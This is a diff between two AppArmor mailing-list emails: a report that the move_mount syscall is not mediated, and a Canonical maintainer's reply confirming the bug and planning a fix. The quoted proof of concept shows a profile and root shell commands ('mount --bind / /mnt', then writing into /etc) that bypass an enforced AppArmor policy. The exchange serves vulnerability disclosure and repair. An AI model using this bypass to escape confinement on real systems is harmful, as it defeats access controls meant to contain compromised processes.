@@ -2,59 +2,50 @@ Return-Path: <apparmor-bounces@lists.ubuntu.com>
 X-Original-To: lists+apparmor@lfdr.de
 Delivered-To: lists+apparmor@lfdr.de
 Received: from lists.ubuntu.com (lists.ubuntu.com [185.125.189.65])
-	by mail.lfdr.de (Postfix) with ESMTPS id CE999799DD4
-	for <lists+apparmor@lfdr.de>; Sun, 10 Sep 2023 13:07:10 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 9F65C799DEE
+	for <lists+apparmor@lfdr.de>; Sun, 10 Sep 2023 13:54:37 +0200 (CEST)
 Received: from localhost ([127.0.0.1] helo=lists.ubuntu.com)
 	by lists.ubuntu.com with esmtp (Exim 4.86_2)
 	(envelope-from <apparmor-bounces@lists.ubuntu.com>)
-	id 1qfIHJ-0003hJ-Oz; Sun, 10 Sep 2023 11:06:57 +0000
-Received: from mail-vs1-f50.google.com ([209.85.217.50])
+	id 1qfJ1C-0000ar-Bs; Sun, 10 Sep 2023 11:54:22 +0000
+Received: from smtp-relay-canonical-1.internal ([10.131.114.174]
+ helo=smtp-relay-canonical-1.canonical.com)
  by lists.ubuntu.com with esmtps (TLS1.2:ECDHE_RSA_AES_128_GCM_SHA256:128)
- (Exim 4.86_2) (envelope-from <anstein99@googlemail.com>)
- id 1qdXGS-0000FZ-4k
- for apparmor@lists.ubuntu.com; Tue, 05 Sep 2023 14:42:48 +0000
-Received: by mail-vs1-f50.google.com with SMTP id
- ada2fe7eead31-44d5696fad1so662374137.1
- for <apparmor@lists.ubuntu.com>; Tue, 05 Sep 2023 07:42:47 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=googlemail.com; s=20221208; t=1693924967; x=1694529767; darn=lists.ubuntu.com;
- h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
- :date:message-id:reply-to;
- bh=LYz2vbEJRgblo+0Q2J89ijQiKx1cbjC9QiVjzgcBoTU=;
- b=jUcXqlKrnBbEP+1I2mcTqhajvSudGTbuRn0s2eiWw990MHgEPv8jzAfnogFLBzoNcD
- qM0cWCFP2LurXQx15z2qrQZCLH3z6WwvgGCyiDqyTNC/X4+x1ZGcKmqG5sJafYKdhPtb
- XOQwPNv41sw7Z+p7i89syYj6fZXGMalyexsuzPlHdnSm7C7ZnyJjldIpvoMHAM0EYL5f
- KgzCZPbY4lfavu2za1LK5Fp+R7X9U1xdJUa3NoE/sdSJj7dTCap+3YqgRXzzaXI5INRw
- P4G4tRU3C4waQbsKTuZY7fmaZDtnVySalROWV5v6v/eN+hfyDAt7CFQgGRso8tFm53xL
- efGQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20221208; t=1693924967; x=1694529767;
- h=to:subject:message-id:date:from:mime-version:x-gm-message-state
- :from:to:cc:subject:date:message-id:reply-to;
- bh=LYz2vbEJRgblo+0Q2J89ijQiKx1cbjC9QiVjzgcBoTU=;
- b=LbR60M+3GgzMH4KCR+22rvs6xzJXSdFV0RYbPknrEiGpRIaE85LI2gn1ETZc8yCxVd
- dZiPfhRHkJIAUcjUKD48g2wB3rsgFlWvxvLXulJHQwy+t47TBHDANZLr59po5q04h3aT
- JlooAzk3TvpDxzL051MuSU8ecoVt830qQJGxO2K+COZXB3sbtdMtGc9Rro6appGopfH9
- VDh9cj6wTJMYxc2Ss1UYXHqmxx+fHzmOMVHzw6pQqbr90W/Cn8eCquxoVz1Eie4uDy2X
- VTPcCmYfNGo4FFUWtSxEzbn1fNEU8UiOy7+bJTTBUm3lKV6DP6Jq2usVJmiftySbEyZ+
- fhcg==
-X-Gm-Message-State: AOJu0YzcTkvjP47u/vW01MC4wLOUcTVjbyQQyYxuJkGrQvZHrfZ5LTHU
- 1TBnrK9HuiC0TXE3b4o7IJCVyaXCe0/JHJddK96H+5FWe3A=
-X-Google-Smtp-Source: AGHT+IH4NTnLaaXvP9f7Kr4PU6zFy2g8UM1yeCxxZQ4Q3HQfz0krtua3R5y1y9jPp/SHYFesjFWzmyT1qF5URnHCDwA=
-X-Received: by 2002:a67:fa14:0:b0:44d:4be4:fe39 with SMTP id
- i20-20020a67fa14000000b0044d4be4fe39mr8270436vsq.5.1693924966867; Tue, 05 Sep
- 2023 07:42:46 -0700 (PDT)
+ (Exim 4.86_2) (envelope-from <john.johansen@canonical.com>)
+ id 1qfJ16-0000aX-6X
+ for apparmor@lists.ubuntu.com; Sun, 10 Sep 2023 11:54:16 +0000
+Received: from [192.168.192.83] (unknown [50.39.103.33])
+ (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+ key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+ (No client certificate requested)
+ by smtp-relay-canonical-1.canonical.com (Postfix) with ESMTPSA id 615DA3F111; 
+ Sun, 10 Sep 2023 11:54:15 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
+ s=20210705; t=1694346856;
+ bh=xlXnWypCFPYC81LPfQWebS5jhmXh94DgzMUTsCikYXE=;
+ h=Message-ID:Date:MIME-Version:Subject:To:References:From:
+ In-Reply-To:Content-Type;
+ b=vkybdS3sjvRhFCwuY344SAkxLXKmvH8jY6+gDdKmI0/vDf2Urb6TG+SPdqH1ZDOgV
+ cboyfG5Ftjf8BHNDHr8RZkTzD8Idv3pjYXeBIlV9cvyMUtBDxN6mqSVN/PXY3mfyc0
+ 0L2nASgbIU5qJX/NUiCeYh9MZA0AWtHnTZ0z16rTZbejsgdcj7dwFVZ+mq7y6VgZsv
+ 12T7XOiAU4aZSIBwSlFkuh6y4VXgVlL9x7HaBdnTA1ECZ/4n2eLq1Xq707S7WESs+v
+ LVlHnsLU8YYerkJ4qgPRQMJ8WunzC5IQmtArt0iCFWMC50rpWdpsy+E/1+P2D4TUmk
+ 07mOdxfbUrVgQ==
+Message-ID: <35f763fe-9a16-2194-6a51-13515f52598a@canonical.com>
+Date: Sun, 10 Sep 2023 04:54:12 -0700
 MIME-Version: 1.0
-From: Andreas Steinmetz <anstein99@googlemail.com>
-Date: Tue, 5 Sep 2023 14:42:29 +0000
-Message-ID: <CAOTMNwtt9=ig9dtOxqyLVBthh+tJJkZEv64qpGN43+-sCBtRrw@mail.gmail.com>
-To: apparmor@lists.ubuntu.com
-Content-Type: text/plain; charset="UTF-8"
-Received-SPF: pass client-ip=209.85.217.50;
- envelope-from=anstein99@googlemail.com; helo=mail-vs1-f50.google.com
-X-Mailman-Approved-At: Sun, 10 Sep 2023 11:06:56 +0000
-Subject: [apparmor] move_mount not handled by AppArmor completely subverts
-	security
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
+ Thunderbird/102.13.0
+Content-Language: en-US
+To: Andreas Steinmetz <anstein99@googlemail.com>, apparmor@lists.ubuntu.com
+References: <CAOTMNwtt9=ig9dtOxqyLVBthh+tJJkZEv64qpGN43+-sCBtRrw@mail.gmail.com>
+From: John Johansen <john.johansen@canonical.com>
+Organization: Canonical
+In-Reply-To: <CAOTMNwtt9=ig9dtOxqyLVBthh+tJJkZEv64qpGN43+-sCBtRrw@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Subject: Re: [apparmor] move_mount not handled by AppArmor completely
+ subverts security
 X-BeenThere: apparmor@lists.ubuntu.com
 X-Mailman-Version: 2.1.20
 Precedence: list
@@ -69,49 +60,79 @@ List-Subscribe: <https://lists.ubuntu.com/mailman/listinfo/apparmor>,
 Errors-To: apparmor-bounces@lists.ubuntu.com
 Sender: "AppArmor" <apparmor-bounces@lists.ubuntu.com>
 
-Tested with kernel 6.4.12-arch1-1
+On 9/5/23 07:42, Andreas Steinmetz wrote:
+> Tested with kernel 6.4.12-arch1-1
+> 
+> AppArmor seemingly doesn't handle the move_mount system call. Thus
 
-AppArmor seemingly doesn't handle the move_mount system call. Thus
-only CAP_SYS_ADMIN is required to bind mount any directory anywhere.
-This allows to completely subvert security including e.g. rootkit
-installation for a process that actually should be confined by an
-enforced AppArmor policy.
+correct,
+commit 2db154b3ea8e ("vfs: syscall: Add move_mount(2) to move mounts around")
 
-Simple policy that should deny mounts and prevent system modification:
+added the move_mount syscall and a new LSM hook, but did not provide
+even stub implementations to existing LSMs, introducing a regression
+in all LSMs implementing mount mediation.
 
-abi <abi/3.0>,
-profile minimal {
- capability sys_admin,
- /bin/bash mr,
- /etc/** mrlk,
- /mnt/** mrwlk,
- /usr/** mrlkix,
- /proc/*/attr/apparmor/current r,
-}
+Unfortunately a fix has not landed in apparmor.
 
-The following test then run as root:
+> only CAP_SYS_ADMIN is required to bind mount any directory anywhere.
 
-[root /]# aa-exec -p minimal /bin/bash
-bash: /dev/null: Permission denied
-bash: /root/.bashrc: Permission denied
-[root /]# cat /proc/self/attr/apparmor/current
-minimal (enforce)
-[root /]# ls -l /etc/malicious_software
-ls: cannot access '/etc/malicious_software': No such file or directory
-[root /]# touch /etc/malicious_software
-touch: cannot touch '/etc/malicious_software': Permission denied
-[root /]# mount --bind / /mnt
-[root /]# touch /mnt/etc/malicious_software
-[root /]# ls -l /etc/malicious_software
--rw-r--r-- 1 root root 0 Sep  5 16:27 /etc/malicious_software
-[root /]#
+correct. It requires cap_sys_admin in the capability set, and the
+profile. Unfortunately if relying on mount mitigations in the profile
+this is a by-pass
 
-This test case is very legitimate as it shows that the MAC enforcement
-by AppArmor is completely bypassed, resulting is standard DAC access
-control, which is not supposed to happen, especially as the enforced
-profile does not allow for any mount operation.
 
-Probably the whole set of system calls mentioned in
-https://lwn.net/Articles/759499/ is probably not handled and thus
-affected.
+> This allows to completely subvert security including e.g. rootkit
+> installation for a process that actually should be confined by an
+> enforced AppArmor policy.
+> 
+correct. Though it is mitigated to a degree by requiring cap_sys_admin
+within the profile.
+
+> Simple policy that should deny mounts and prevent system modification:
+> 
+> abi <abi/3.0>,
+> profile minimal {
+>   capability sys_admin,
+>   /bin/bash mr,
+>   /etc/** mrlk,
+>   /mnt/** mrwlk,
+>   /usr/** mrlkix,
+>   /proc/*/attr/apparmor/current r,
+> }
+> 
+> The following test then run as root:
+> 
+> [root /]# aa-exec -p minimal /bin/bash
+> bash: /dev/null: Permission denied
+> bash: /root/.bashrc: Permission denied
+> [root /]# cat /proc/self/attr/apparmor/current
+> minimal (enforce)
+> [root /]# ls -l /etc/malicious_software
+> ls: cannot access '/etc/malicious_software': No such file or directory
+> [root /]# touch /etc/malicious_software
+> touch: cannot touch '/etc/malicious_software': Permission denied
+> [root /]# mount --bind / /mnt
+> [root /]# touch /mnt/etc/malicious_software
+> [root /]# ls -l /etc/malicious_software
+> -rw-r--r-- 1 root root 0 Sep  5 16:27 /etc/malicious_software
+> [root /]#
+> 
+> This test case is very legitimate as it shows that the MAC enforcement
+> by AppArmor is completely bypassed, resulting is standard DAC access
+> control, which is not supposed to happen, especially as the enforced
+> profile does not allow for any mount operation.
+> 
+correct
+
+> Probably the whole set of system calls mentioned in
+> https://lwn.net/Articles/759499/ is probably not handled and thus
+> affected.
+> 
+
+yes and no - there is certainly a need for additional mediation on
+them. I need to dig deeper to establish exactly what needs to be
+done.
+
+I will reply to this with a first pass at addressing move_mount.
+
 
